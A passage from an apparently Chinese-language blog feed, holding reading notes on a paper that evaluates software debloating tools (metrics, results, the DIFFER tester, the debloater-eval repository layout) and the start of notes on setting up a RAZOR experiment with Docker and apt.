指标选择</h4><ul><li>我们选择了16个指标（表3），来评估去简化器本身以及它们产生的去膨胀程序/库<ul><li>其中12个指标来自于第2.4节中概述的三个类别中常用的指标。通常我们选择从程序二进制文件的分析中计算的指标，因为这是所有去膨胀工具的共同程序表示<ul><li>值得注意的是，由于其较差的预测能力（不具有普遍性），我们选择不在我们的评估中使用CVE消除作为安全指标。</li></ul></li><li>我们进一步添加了四个工具可用性指标，以记录配置和使用去膨胀工具的主要差异。我们在第4节中提供了每个指标是如何计算以及我们的评估结果的详细信息。<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(12)_3.png" alt></li></ul></li></ul><h3 id="4-%E8%AF%84%E4%BC%B0%E7%BB%93%E6%9E%9C" tabindex="-1">4 评估结果</h3><ul><li>我们按照指标类别组织了我们的评估结果。<ul><li>首先，我们展示了工具本身的可用性和性能结果</li><li>然后是通过分析它们产生的去膨胀程序的性能、正确性和安全性指标。</li></ul></li><li>请注意，我们在本节中讨论了每个指标的重要发现和结果，但将整体和跨类别的分析留给第5节。</li></ul><h4 id="4.1-%E5%B7%A5%E5%85%B7%E5%8F%AF%E7%94%A8%E6%80%A7%E5%92%8C%E6%80%A7%E8%83%BD" tabindex="-1">4.1 工具可用性和性能</h4><ul><li>简化工具的一个主要目标是非专家用户可以使用来转换软件。<ul><li>每个工具的设计和用户界面影响其实现此目标的能力。我们提供的前六个指标，集中在简化工具的面向用户的方向：它们的可用性和性能。</li><li>我们假设用户已在适当的计算环境中为其安装了该工具，部署去膨胀的程序不再我们评估的范围</li><li>我们认为软件简化所需的所有工作都在面向用户的评估范围内<ul><li><ol><li>配置工具</li></ol></li><li><ol start="2"><li>使用基准集</li></ol></li><li><ol start="3"><li>运行工具</li></ol></li><li><ol start="4"><li>维护程序的简化版本以面对未来的变化</li></ol></li></ul></li></ul></li></ul><h5 id="usability-1%EF%BC%9A%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7%E7%9A%84%E6%97%B6%E9%97%B4" tabindex="-1">Usability-1：配置工具的时间</h5><p>-为了比较用户配置简化的体验，我们记录了每个工具创建和验证具体简化规范所需的时间。在创建规范之前，我们通过它们的文档和示例熟悉了这些工具及其规范格式。这些测量只旨在为生成规范所需的努力提供大致的估计。</p><ul><li>表4显示了创建规范所需的平均时间，四舍五入到最近的分钟。我们根据第3.2节定义的三个基准复杂性级别计算平均值。<ul><li>在针对Type II膨胀的工具中，CBS工具生成规格所需的时间最短，因为其为激进的用例，规范仅包括一个测试用例。</li><li>B2B简化工具通常要15min到1h，其时间与测试用例数量成比例</li><li>S2S对于低复杂度基准配置简单，而中高复杂度需要几个小时。<ul><li>这主要由Chisel的设计引起，Chisel为了确定可删除代码，通过ML引导的Delta Debugging算法迭代地删除代码片段，然后编译运行修改后的代码看是否能通过测试用例。正确的Oracle是关键，因为会生成可以编译但运行错误的程序</li></ul></li><li>这些工具还需要额外的测试用例，来确保不删除必要的但不影响通过测试用例（例如安全控制和错误处理）的代码。其他工作已经提出了这样的问题，并显示当它们的补丁未被执行时，CHISEL会重新引入历史上的CVE[48]。<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(12)_4.png" alt></li></ul></li></ul><h5 id="usability-2%EF%BC%9A%E5%9F%BA%E5%87%86%E4%BD%BF%E7%94%A8%E6%97%B6%E9%97%B4" tabindex="-1">Usability-2：基准使用时间</h5><ul><li>三个简化工具需要用户的额外努力来使用基准程序，我们认为这与创建规范无关的，将其单独提出来。<ul><li>Chisel和Chisel-GT在中高复杂度基准集中无法在48h内结束运行，这是其代码设计的问题。为了评估这些工具超出ChiselBench（即低复杂度基准集）的表现，我们与工具的开发者何坐，实现了一个并行化框架以提高性能，使其满足我们对合理运行时的标准（48h）。最后需要26h完成</li><li>LMCAS-SIFT引入了一个“程序颈”的概念，定义为程序的配置逻辑（即 命令行 或/和 配置文件解析代码）和主逻辑（程序的其余部分）之间的边界。 LMCAS-SIFT要求在简化前识别一个合适的“颈”，并为此提供了一个叫neck miner的工具，然而这个工具不总是成功识别颈，导致简化失败，此时用户必须手动识别。<ul><li>在我们的评估中，neck miner未能自动为gzip、mkdir、sort、tar和uniq放置颈，并且平均需要8分钟手动放置它。8min发生在低复杂度基准测试上。在更复杂的基准测试上手动放置颈部可能需要更多时间</li></ul></li></ul></li></ul><h5 id="performance-1%EF%BC%8C2%EF%BC%9A%E5%B7%A5%E5%85%B7%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4%E5%92%8C%E5%B3%B0%E5%80%BC%E5%86%85%E5%AD%98%E4%BD%BF%E7%94%A8" tabindex="-1">Performance-1，2：工具运行时间和峰值内存使用</h5><ul><li>在完成工具配置和手动调整基准集后，接下来测量工具在基准上测试时的性能。</li><li>我们在表5中总结了这些工具在每个复杂度级别的所有基准测试上的平均CPU运行时间（以分钟为单位）和峰值内存使用情况。<ul><li>请注意，我们在这些计算中包括了失败的去膨胀操作。我们仅排除那些与该工具不兼容的基准测试，原因可能是该工具不支持C++代码、多线程程序等。</li><li>表5中的第一组列显示了每个复杂度级别上每个工具的兼容基准测试数量，总共有10个低复杂度、6个中等复杂度和4个高复杂度的基准测试。</li><li>除明显的异常值（objdump）外，所有简化工具在平均20min内完成简化。</li><li>CHISEL和CHISEL-GT分别需要CPU小时和CPU天来运行，因为其方法设计原因。</li><li>在内存小号方面，简化工具通常需要与目标程序相当的内存，除了使用RAZOR简化高复杂度程序需要使用31GB外，所有其他工具峰值为6GB甚至更少<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(12)_5.png" alt></li></ul></li></ul><h5 id="usability-3%EF%BC%9A%E6%93%8D%E4%BD%9C%E5%91%98%E6%89%80%E9%9C%80%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86" tabindex="-1">Usability-3：操作员所需专业知识</h5><ul><li>配置工具，运行工具，调试基准集都需要不同的专业知识，我们根据以下三个定义定义该指标<ul><li><strong>Low</strong>：操作员不需要了解工具或软件的内部工作原理就可以有效地进行去膨胀。</li><li><strong>Medium</strong>：操作员需要了解软件的内部工作原理，但不需要了解工具就可以有效地进行去膨胀。</li><li><strong>High</strong>：操作员需要了解工具和目标软件的内部工作原理才能有效地进行去膨胀</li></ul></li><li>我们在表6中展示了评估结果<ul><li>SL简化工具需要的专业只是最少，因为其不需要规范</li><li>CBS简化工具需要低级的专业知识，因为用户只需要熟悉软件的运行方式，但由于技术限制（即，OCCAM需要枚举链接库的构建选项，LMCAS-SIFT可能需要手动放置“neck”），实际上只有TRIMMER需要低级别的专业知识。</li><li>B2B简化工具需要枚举测试用例，以确保在分析阶段使用的动态跟踪具有足够的覆盖范围，从而产生合适的简化文件，所以需要中等级别的专业知识</li><li>Chisel和Chisel-GT由于需要专业的测试用例和验证脚本，需要最高级别的专业知识<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(12)_6.png" alt></li></ul></li></ul><h5 id="usability-4%EF%BC%9A%E7%BB%B4%E6%8A%A4%E9%9A%BE%E5%BA%A6" tabindex="-1">Usability-4：维护难度</h5><ul><li>评估简化后的程序长期维护的影响，主要考虑更新后修改简化规范并重新运行简化工具的难度，同时也考虑简化后的程序本身是否可以维护（例如，直接将补丁用于简化后的版本），我们定义这个指标如下<ul><li><strong>Low</strong>：工具可以在每次构建时运行，对用户来说成本微乎其微（即编译时间）。</li><li><strong>Medium</strong>：工具对程序表示进行了永久性更改，可以在去膨胀后进行维护。</li><li><strong>High</strong>：工具可能需要重新配置，并且每次原始程序更改时都必须完全重新运行。</li></ul></li><li>结果在表6中<ul><li>SL简化工具具有低维护难度，因为其对用户可以完全透明，并在程序更新时轻松重新运行</li><li>CBS去膨胀工具同样易于维护，因为它们对编译器施加了影响，但由于可能需要对原始程序的更改进行工具重新配置，我们评估它们的维护难度为中等。</li><li>CHISEL和CHISEL-GT评为中等维护难度，因为它们产生的是简化的源代码输出，这些代码可以在简化后直接修补或更新。</li><li>B2B简化工具标记为高难度，因为当原始程序进行上游更改时，它们必须重新配置和重新运行。值得注意的是，B2B去膨胀工具主要用于与旧版二进制文件一起使用，因此它们的维护难度可能不是它们使用的主要缺点。</li></ul></li></ul><h4 id="4.2-%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD" tabindex="-1">4.2 程序性能</h4><ul><li>软件简化旨在再进，或者至少移除代码后不会对程序的性能产生负面影响。<strong>主要期望</strong>是简化后的程序再磁盘上和运行时内存都占用更少空间。如果简化的程序结构得到，其中不必要的代码经常被执行，那么简化后执行的更快是不切实际的。相反，简化操作可能降低运行时性能。</li><li>本节提供了四个性能指标，这些指标基于使用这些工具产生的简化二进制文件和库</li></ul><h5 id="performance-5%EF%BC%9A%E9%9D%99%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A4%A7%E5%B0%8F" tabindex="-1">Performance-5：静态二进制大小</h5><ul><li>我们记录了每个成功简化的二进制文件在磁盘上的大小，并将其与原始程序的二进制文件大小进行比较。<ul><li>由于LMCAS-SIFT和SL简化工具在实现上的差异，我们对计算进行了修改。</li><li>Libfilter生成了基准程序的链接库的新的精简版本；因此，我们将简化后的库的总大小与原始库进行比较。</li><li>由LMCAS-SIFT和Binary Reduce (Static)创建的简化程序都是静态链接的二进制文件。对于这些文件，我们将静态链接二进制文件的大小与原始二进制文件及其动态链接库的总大小进行比较。</li></ul></li><li>我们用百分比表示大小变化，低于100%即大小减小。我们计算了3个复杂度基准下二进制文件大小变化，如图7示,第一组列为成功简化的程序数量。BinRec-ToB无法成功地去膨胀任何基准程序，因此我们在评估中从这个和所有后续表格中排除了它。<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(12)_7.png" alt></li><li>上表揭示了一些有趣的结果<ul><li>在所有复杂性级别上，RAZOR和Libfilter产生的去膨胀二进制文件平均较大。因为RAZOR将程序的去膨胀版本缝合到原始二进制文件的新代码部分，并标记原始代码部分为非可执行，而不是真正删除它。同样，Libfilter将不可达函数重写为HLT指令，而不是删除它们</li><li>总体上，其他工具对低复杂度基准实现了大幅减少，但在高复杂性基准上效果差异明显。这与在高复杂性基准程序上的低成功率（只有10个工具中的3个成功处理了所有四个）相结合，表明这些工具可能过度拟合于低和中复杂性基准程序。</li></ul></li></ul><h5 id="performance-6%EF%BC%9A%E9%93%BE%E6%8E%A5%E5%BA%93%E6%95%B0%E9%87%8F" tabindex="-1">Performance-6：链接库数量</h5><ul><li>记录简化前后基准程序链接的外部库数量。<ul><li>我们在这次评估中排除了LMCAS-SIFT和SL去膨胀工具，因为它们直接操作库。我们的结果仅供参考，因为通过去膨胀消除库在很大程度上取决于规范。</li><li>Binary Reduce (Dynamic)、CHISEL和CHISEL-GT在中等和高复杂性基准程序中通常成功地消除了一个或多个库，基于其设计，这是合理的</li><li>然而在TRIMMER和OCCAM在简化后的程序中引入了新的库。引入的库通常是libc++、libgcc和libm，这可能是由于工具使用其自定义的LLVM编译器转换通道对程序进行的更改所导致的。这些库相当大且计算复杂。根据用户简化的目标（例如，最小化代码大小或可重用性），引入这样的新依赖可能会适得其反。</li></ul></li></ul><h5 id="performance-3%EF%BC%8C4%EF%BC%9A%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4%E5%92%8C%E5%B3%B0%E5%80%BC%E5%86%85%E5%AD%98%E4%BD%BF%E7%94%A8" tabindex="-1">Performance-3，4：程序运行时间和峰值内存使用</h5><ul><li><p>为每个基准程序创建测试套件，根据我们的规范（中等和激进）对保留的功能进行测试。这些测试套件旨在尽可能地进行严格和长时间的运行。</p></li><li><p>我们对每个基准程序的参考二进制文件以及每个成功简化的二进制文件运行这些测试套件，记录总运行时间（以CPU秒为单位）和峰值内存消耗（以MB为单位）。</p></li><li><p>在许多情况下，简化的程序由于崩溃，无限执行或运行时错误无法完成测试，我们排除了这些失败</p></li><li><p>我们计算运行时间和峰值内存的变化百分比，其中值低于100%表示减少。然后我们计算了每个复杂度级别的平均值，如图8所示。第一列显示了每个工具在每个复杂性级别上成功完成性能测试的去膨胀基准程序数量。注意到我们排除了CHISEL的3个中等复杂性和2个高复杂性基准程序，因为CHISEL在没有修改源代码的情况下“成功”处理了这些基准程序（大概是没跑出结果）。<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(12)_8.png" alt></p></li><li><p>我们的评估揭示了一些重要的发现：</p><ul><li>对于中高复杂度的基准程序，所有的简化工具失败率都很高。总体上，简化的成功率只有22%，这对用于实际软件的简化技术提出了疑问</li><li>对于低复杂度的基准程序成功率也低于预期，尽管CHISELBench在文献中被广泛使用，但只有OCCAM和RAZOR成功地简化了所有的低复杂性基准程序。相反，BinRecToB和Binary Reduce (Dynamic)没有成功简化任何低复杂性基准程序。</li></ul></li><li><p>关于我们的性能指标，我们观察到只有少数简化的程序的性能明显差于其未修改的对应程序。</p><ul><li>除了CHISEL的一个异常值外，只有TRIMMER和OCCAM在多个复杂性级别上都显示出了一致且显著的（&gt;4%）对运行时间或内存消耗的负面影响。</li><li>其中最显著的是TRIMMER简化高复杂性基准程序运行时间增加了29.4%，以及OCCAM简化的低复杂性基准程序运行时间增加了18.3%。</li></ul></li></ul><h4 id="4.3-%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8" tabindex="-1">4.3 程序安全</h4><ul><li>除性能改进外，简化文献经常提及程序安全的改进（如攻击面的减少）作为一个主要激励目标。然而攻击面减少的具体定义有很大的差异，并缺乏合理有效的标准来度量。鉴于其它常用度量标准的缺陷（如消除已知的漏洞），我们采用了四个度量指标，重点关注code re-usability prevention（代码重用预防）。</li><li>我们使用GSA[12]来分析我们简化二进制文件及未修改的对应部分，计算我们的度量指标，这些指标反映了在 W⊕X 和 ASLR 等常见安全控制存在的情况下，攻击者可以如何轻易地重复使用程序及其链接库中的代码来制造漏洞。</li><li>在没有事先知道程序中实际存在的漏洞的情况下，这些度量标准为简化的卫全好处提供了定性评估。</li></ul><h5 id="security-1%EF%BC%8C2-%E5%B0%8F%E5%B7%A5%E5%85%B7%E9%9B%86%E7%9A%84%E8%A1%A8%E8%BE%BE%E8%83%BD%E5%8A%9B%E5%92%8C%E8%B4%A8%E9%87%8F" tabindex="-1">Security-1，2 小工具集的表达能力和质量</h5><ul><li><p>前两个度量标准关注于程序二进制文件中可用的功能代码重用小工具的集合属性。攻击者会像在编程语言中的指令那样，将功能代码重用小工具链接在一起，以编写并启动一个攻击，而无需注入代码。</p></li><li><p><strong>小工具集表达能力</strong>：度量了二进制文件中功能小工具的集体表达能力，以确定它们是否足以启动实用的攻击。</p><ul><li>GSA 定义了 11 种不同的功能类别，小工具集中的小工具必须满足这些类别才能达到这一标准，并以满足类别的数量来报告表达能力</li></ul></li><li><p><strong>小工具集质量</strong>：度量了集合中小工具的平均链式能力，以确定它们可以多么容易地组合。</p><ul><li>对于攻击者有用的小工具，它们通常包含对其目的无关的机器指令，但可能对创建小工具链产生副约束（即，改变堆栈指针）。</li><li>GSA通过使用0.0的起始分数并为每个检测到的副约束增加这个分数来度量每个小工具的质量。整体集质量是计算为所有小工具的平均分数。</li></ul></li><li><p>对于这两个度量标准，GSA将简化的二进制文件与原始文件进行比较，并报告值变化。</p><ul><li>对于LMCAS-SIFT和SL，我们在比较中包括了库</li><li>表达性的负值表示负面结果：简化二进制文件中的小工具集满足的表达性类别比原始文件更多。</li><li>对于小工具集的质量，则相反<ul><li>正值表示去膨胀后，每个小工具的平均副约束数量减少了。</li><li>但是，值在任何方向上小于0.5都不足以表示显著性，因为GSA的质量评分系统将次要的副约束值设为0.5，而将主要的副约束值设为3.0。</li><li>我们对GSA报告的度量标准进行了平均处理，显示在表9中。第一组列显示了每个工具在每个复杂性级别上成功去膨胀的基准数量<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(12)_9.png" alt></li></ul></li></ul></li><li><p>总体而言，根据这两个度量标准，我们评估的简化工具对安全性<strong>没有产生显著影响</strong></p><ul><li>多数情况下，我们的数据表明，某些工具和复杂性级别的表现性和链式能力都有所提高</li><li>只有TRIMMER在四个高复杂性基准测试上的表现显著不好，平均提高了3.5个表达性类别</li></ul></li></ul><h5 id="security-3-%E5%B0%8F%E5%B7%A5%E5%85%B7%E9%9B%86%E5%B1%80%E9%83%A8%E6%80%A7" tabindex="-1">Security-3 小工具集局部性</h5><h5 id="security-4-%E5%8F%AF%E4%BE%9B%E9%80%89%E6%8B%A9%E7%9A%84%E7%89%B9%E6%AE%8A%E7%94%A8%E9%80%94%E5%B0%8F%E5%B7%A5%E5%85%B7%E7%B1%BB%E5%9E%8B" tabindex="-1">Security-4 可供选择的特殊用途小工具类型</h5><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(12)_10.png" alt></p><h4 id="4.4-%E6%AD%A3%E7%A1%AE%E6%80%A7%E5%92%8C%E9%B2%81%E6%A3%92%E6%80%A7" tabindex="-1">4.4 正确性和鲁棒性</h4><h5 id="correctness%2Frobustness-1-executes-retained-functions" tabindex="-1">Correctness/Robustness-1 Executes Retained Functions</h5><h5 id="correctness%2Frobustness-2-errors-%2F-crashes-during-differential-testing" tabindex="-1">Correctness/Robustness-2 Errors / Crashes during Differential Testing</h5><ul><li><p>简化转换是复杂的，确保转换不损害程序健壮性是具有挑战性的，无论是在生产前（即，S2S）、生产过程中（即，CBS）还是生产后（即，B2B、SL）实施的。</p></li><li><p>有缺陷或不完整的转换会对程序产生负面影响，表现为辑错误、运行时错误、崩溃，有时还可能引入新的漏洞。</p><ul><li>我们在基准性能测试（第4.2节）中，我们发现了大量的证据，其中36.6%的在我们的评估中生成的去膨胀二进制文件未能执行其保留的功能。</li></ul></li><li><p>这突显了简化后验证的重要性，这是简化工作流程中经常被忽视或完全留给用户的一个阶段，尤其是针对Type II膨胀的工具。</p><ul><li>一定程度上是由于缺乏有效的测试工具，如回归测试和模糊测试，并不自然地支持测试去膨胀程序与其原始版本之间的差异</li><li>为此，我们创建了一个针对转换后程序的差异测试工具，名为DIFFER，该工具结合了差异、回归和模糊测试方法的元素。</li></ul></li><li><p>DIFFER 允许用户指定与保留和简化功能对应的种子输入。它使用这些输入运行原始程序及其一个或多个简化变体，并比较它们的输出。</p><ul><li>DIFFER 期望对于保留功能的输入，原始程序和去膨胀程序的输出应该相同。</li><li>相反，它期望对于去膨胀功能的输入，原始程序和去膨胀程序的输出应该不同。</li><li>如果 DIFFER 检测到意外的匹配、差异或崩溃，它会向用户报告，供其检查。DIFFER 的报告可以帮助用户识别去膨胀工具配置中的错误或去膨胀程序不健全的实例。与所有动态分析工具一样，DIFFER 的报告可能存在误报的可能性。为了将误报率降到最低，DIFFER 允许用户定义自定义输出比较器，以考虑输出中的预期差异（例如，程序会为其控制台输出添加时间戳）。</li><li>此外，DIFFER 支持基于模板的变异模糊测试种子输入，以确保对去膨胀和保留功能的输入空间进行最大覆盖。</li><li>DIFFER 不能为去膨胀工具或其生成的去膨胀程序提供正式的健壮性保证。且不能对复杂程序的输入空间进行详细测试，但在验证中非常有用，因为其对用户友好，只需要适中的用户专业知识</li></ul></li><li><p>使用我们在第3.3节中创建的通用简化规范作为起点，我们配置了 DIFFER 来测试每个基准程序的保留和简化掉的功能。我们对成功完成性能测试的每个简化基准程序（共90个变体）运行了 DIFFER，最长达12小时，以识别简化过程中引入的崩溃、不一致性或错误，以及未能去除应该去除的功能。我们的<strong>结果令人担忧</strong>：</p><ul><li>DIFFER 发现了27.8%（90个中的25个）的简化基准中存在错误或崩溃</li><li>简化工具在其余的简化基准中未能去除应该简化掉的的功能，占60%（65个中的39个）。</li><li>在 DIFFER 的测试中通过的最终26个去膨胀基准中，有13个是由 Binary Reduce（静态）产生的，七个是由 libfilter 产生的，四个是由 LMCAS-SIFT 产生的，而 OCCAM 和 CHISEL 各自产生了一个。</li></ul></li><li><p>我们的评估中，50%（40个中的20个）的去除 Type I 膨胀尝试最终成功，而只有3.3%的去除 Type II 膨胀尝试成功（180个中的6个）。我们的结果表明，文献中对简化后验证的普遍忽视导致了对成功简化的过度报告。</p></li></ul><h3 id="5-%E8%AE%A8%E8%AE%BA%E5%92%8C%E5%85%B3%E9%94%AE%E5%8F%91%E7%8E%B0" tabindex="-1">5 讨论和关键发现</h3><ul><li><strong>工具成熟度</strong><ul><li>简化工具缺乏在实际软件上所需的成熟度<ul><li>所有工具在所有基准简化后上只有42.5%的成功率通过性能测试</li><li>在中高复杂基准上只有21%的成功率</li></ul></li><li>这表明当前的简化工具可能过于适应较低复杂性的基准，之后新的方法应该重点关注更复杂的软件和编程语言特性/范式</li></ul></li><li><strong>Soundness Issues</strong><ul><li>使用DIFFER进行正确性和健壮性测试时，在我们评估的十个工具中，只有两个工具，即静态和动态的简化二进制，没有产生不健全的简化二进制文件（即，DIFFER没有检测到任何崩溃、失败或在保留功能中的错误）。然而，之所以是健全的，是因为该工具没有成功地去膨胀任何功能，这得到了这个二进制文件在去膨胀后增加了大小的事实的支持。</li><li>其余的工具每个都产生了比原始程序更多的错误（除了BinRec-ToB，它没有产生任何去膨胀的二进制文件）</li><li>虽然我们的性能测试和DIFFER检测到的大部分健全性问题都是与保留功能有关的问题，但我们的结果还揭示了与简化功能相关的严重程序健全性问题。新的方法必须发展起来，以缝合被切除代码留下的空洞。在我们的调查中，我们只观察到一个具有此能力的工具：CARVE[11]</li></ul></li><li><strong>边际效益和安全收益</strong><ul><li>我们评估的所有工具都没有在除了小工具局部性外的性能或安全性上实现改进</li><li>一些工具确实缩小了静态二进制大小，但这些改进是通过激进的简化和去除静态链接实现的，这限制了缩小的实用性</li><li>考虑到上述成熟度和Soundness问题，我们认为用户可能会发现简化的好处没有超过成本和潜在风险</li></ul></li></ul><h3 id="6-%E7%BB%93%E8%AE%BA" tabindex="-1">6 结论</h3><ul><li>本文中，我们对软件简化生态进行了调查，在调查中我们创建了<ul><li>一个简化工具分类方法</li><li>16个评估指标</li><li>包含20个不同复杂性的基准程序</li></ul></li><li>我们评估比较了4类中10个不同的工具，评估标明<ul><li>当前一代简化工具存在缺陷，使之不能再实际软件上应用，具体来说<ul><li>简化工具对于中高复杂度的程序支持有限</li><li>简化过程中难以维系健全性和健壮性</li><li>在提高程序的性能和安全上成果有限</li></ul></li></ul></li><li>我们已经公开了我们的基准集，数据和自定义工具，以推动简化工具的进一步发展</li></ul><h3 id="7-availability" tabindex="-1">7 availability</h3><p><a href="https://github.com/trailofbits/debloater-eval">评估</a><br><a href="https://github.com/trailofbits/differ">Differ工具</a></p><h3 id="8-%E4%BB%93%E5%BA%93%E5%AD%A6%E4%B9%A0" tabindex="-1">8 仓库学习</h3><p><a href="https://github.com/trailofbits/debloater-eval">仓库地址</a></p><h4 id="%E7%9B%AE%E5%BD%95%E5%88%86%E6%9E%90" tabindex="-1">目录分析</h4><h5 id="benchmarks" tabindex="-1">benchmarks</h5><p>benchmarks：包含基准程序和基准工具（包括人工改造版本）</p><ul><li>benchmarks-debloated:基准工具（因为每个基准程序能用到的基准工具不同，所以按照基准程序分的文件夹,具体在result的表格中可以看到针对特定基准软件哪些工具无法使用）<ul><li>high</li><li>low</li><li>medium</li></ul></li><li>benchmarks:基准程序<ul><li>high<ul><li>imagemagick-7.0.1-0</li><li>nginx-1.23.3</li><li>nmap-7.93</li><li>poppler-0.60</li></ul></li><li>low：就是chiselbench中的10个util-core程序，指举一个例子<ul><li>bzip2-1.0.5<ul><li>binaries:包含其各个形式的二进制文件</li><li>lmcas，occam_x64_bin,trimmer_x64_bin:针对各个工具的特殊二进制</li><li>source：源代码<ul><li>merged：将源代码项目合成一个文件</li><li>original：原始源代码项目</li></ul></li></ul></li></ul></li><li>medium<ul><li>bftpd-6.1</li><li>binutils-2.27</li><li>lighttpd-1.4</li><li>make-4.2</li><li>memcached-1.6.18</li><li>tcpdump-4.99.3</li><li>wget-1.20.3</li></ul></li></ul></li></ul><h5 id="metrics" tabindex="-1">metrics</h5><p>metrics: 包括评估脚本（基准程序需要跑得）和评估性能指标</p><ul><li>performance-test<ul><li>original：这个目录包含在原始基准测试上运行性能测试并收集指标的文件。指标将保存到 binary_metrics.csv 中。 有README<ul><li>Dockerfile:镜像构造</li><li>run_perf_tests.py 自动化测试脚本（TODO分析）</li></ul></li><li>performance-benchmarks：基准使用的脚本，包含不同场景。 有README<ul><li>inputs 文件夹：包含各个软件的测试用例输入</li><li>lib 文件夹：包含各个软件的功能各个场景脚本，每个脚本名字即<code>基准名字.sh</code>，一个场景即脚本中的一个函数</li><li>剩余脚本为测试脚本，名字为<code>benchmark_&lt;基准名字&gt;.sh</code>,大多数脚本需要一个参数，即二进制文件路径，少部分脚本需要其他参数，可以使用<code>-h</code>查看详情<ul><li>测试脚本还包括激进版本，即<code>benchmark_aggressive_&lt;基准名字&gt;.sh</code>，即只包含单个功能</li></ul></li></ul></li></ul></li></ul><h5 id="results" tabindex="-1">results</h5><p>results：包含原始和精简的评估结果以及创建它们的脚本。</p><ul><li><p>Debloater Eval Results.xlsx : 包括所有评测结果的表格</p></li><li><p>Debloater Evaluation Knowledge Base.xlsx : 包含作者科研的知识步骤</p></li><li><p>metrics-calcs：包含与简化评估相关的脚本和数据，包括 GSA，DIFFER，Dynamic libraries and File Size</p><ul><li>scripts:用于运行实验和评估结果的通用Python脚本。</li><li>results<ul><li>gsa：包含GSA评估的结果</li><li>differ：包含DIFFER评估的结果</li><li>file-stats:动态连接库和文件大小的结果</li></ul></li><li>batches：只能每个批次运行的配置文件</li><li>eval-scripts：包含特定实验运行的脚本</li><li>environment：包含配置实验环境的脚本和dockerfile</li></ul></li><li><p>differ实验结果</p></li></ul><h5 id="scripts" tabindex="-1">scripts</h5><p>scripts：包含用于自动化评估不同部分的各种脚本（未维护）。</p><ul><li>build-binaries：包含用于构建二进制文件的脚本，使用py脚本，在docker中进行构建</li><li>debloater_eval:收集评估结果的脚本，输出为csv</li><li>tests：TODO了解</li></ul><h5 id="tools" tabindex="-1">tools</h5><p>tools：包括可重复构建的环境，用于托管工具和评估中使用的简化规范。</p><ul><li><ol><li>GTIRB To Static：用于静态地剪裁掉不可达的库和代码，利用了&quot;Reachable Reduce&quot;。</li></ol></li><li><ol start="2"><li>LMCAS-METIS：使用一个规范（spec）以及对源代码的修改来对其进行简化。</li></ol></li><li><ol start="3"><li>OCCAM：根据其 GitHub 描述，这是一个针对 LLVM 位代码的“整体程序偏特化器（whole-program partial evaluator）”，旨在对在特定部署环境中运行的程序和共享/静态库进行简化。</li></ol></li><li><ol start="4"><li>Trimmer</li></ol></li><li><ol start="5"><li>chisel-2：需要token</li></ol></li><li><ol start="6"><li>chisel：源代码简化工具，它使用一个 oracle 来引导基于增量调试的减小过程。</li></ol></li><li><ol start="7"><li>GTIRB To Dynamic：使用 gtirb-block-trace。</li></ol></li><li><ol start="8"><li>Libfilter(Nibbler):采用静态分析来检测程序及其共享库中未使用的函数调用。随后，它删除这些未使用的函数，生成一个精简的二进制文件。</li></ol></li><li><ol start="9"><li>razor：用DynamoRIO对二进制文件进行插装，从而删除测试套件未执行的指令。</li></ol></li><li><p>tool-debloating-specs：包含已经写好的规范</p></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareEngineering </tag>
            
            <tag> SoftwareDebloating </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复杂软件简化分析实验</title>
      <link href="/2024/02/04/%E6%9C%AC%E7%A7%91/%E6%9C%AC%E7%A7%91%E6%AF%95%E4%B8%9A%E8%AE%BA%E6%96%87/%E5%A4%8D%E6%9D%82%E8%BD%AF%E4%BB%B6%E7%AE%80%E5%8C%96%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C/"/>
      <url>/2024/02/04/%E6%9C%AC%E7%A7%91/%E6%9C%AC%E7%A7%91%E6%AF%95%E4%B8%9A%E8%AE%BA%E6%96%87/%E5%A4%8D%E6%9D%82%E8%BD%AF%E4%BB%B6%E7%AE%80%E5%8C%96%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>实验按照对每个工具运行每个基准</p><h2 id="razor" tabindex="-1">RAZOR</h2><ol><li>获取镜像<code>sudo docker pull chenxiong/razor:0.01</code></li><li>运行镜像<code>sudo docker run --name container_name -d -it chenxiong/razor:0.01</code></li><li>更新razor仓库</li><li>替换debian源为阿里源<code>sudo vim /etc/apt/sources.list</code></li></ol><pre><code class="language-bash">deb http://mirrors.aliyun.com/debian/ buster main non-free contribdeb http://mirrors.aliyun.com/debian/ buster-updates main non-free contribdeb http://mirrors.aliyun.com/debian/ buster-backports main non-free contribdeb http://mirrors.aliyun.com/debian-security buster/updates maindeb-src http://mirrors.aliyun.com/debian/ buster main non-free contribdeb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contribdeb-src http://mirrors.aliyun.com/debian-security buster/updates main</code></pre><ol start="5"><li>下载Clang <code>apt install clang</code></li></ol><h3 id="nginx" tabindex="-1">nginx</h3><h3 id="lighttpd" tabindex="-1">lighttpd</h3><p><a href="https://redmine.lighttpd.net/projects/lighttpd/wiki/InstallFromSource">从源码编译步骤</a></p><ol><li>克隆并更新仓库</li></ol><pre><code class="language-bash"># initial checkoutgit clone 